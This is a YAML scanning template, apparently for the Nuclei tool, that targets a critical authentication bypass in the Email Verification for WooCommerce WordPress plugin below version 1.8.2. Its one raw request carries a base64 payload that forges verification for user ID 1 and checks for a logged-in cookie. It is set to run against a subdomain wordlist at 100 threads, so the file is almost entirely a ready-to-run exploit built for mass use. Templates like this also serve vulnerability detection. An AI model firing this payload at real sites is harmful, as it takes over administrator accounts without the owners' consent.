id: wp-woocommerce-email-verification 2
info:
  author: random_robbie
  description: Email Verification for WooCommerce < 1.8.2 - Loose Comparison to Authentication
    Bypass
  name: wordpress-emails-verification-for-woocommerce
  reference: https://wpvulndb.com/vulnerabilities/10318
  severity: critical
  tags: wordpress,wp-plugin
requests:
- attack: sniper
  matchers:
  - part: header
    type: word
    words:
    - wordpress_logged_in
  - negative: true
    status:
    - 401
    - 403
    type: status
  matchers-condition: and
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'GET /blog/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0= HTTP/1.1

    Host: {{Subdomains}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0

    Accept-Encoding: gzip, deflate

    Accept: */*

    '
  threads: 100
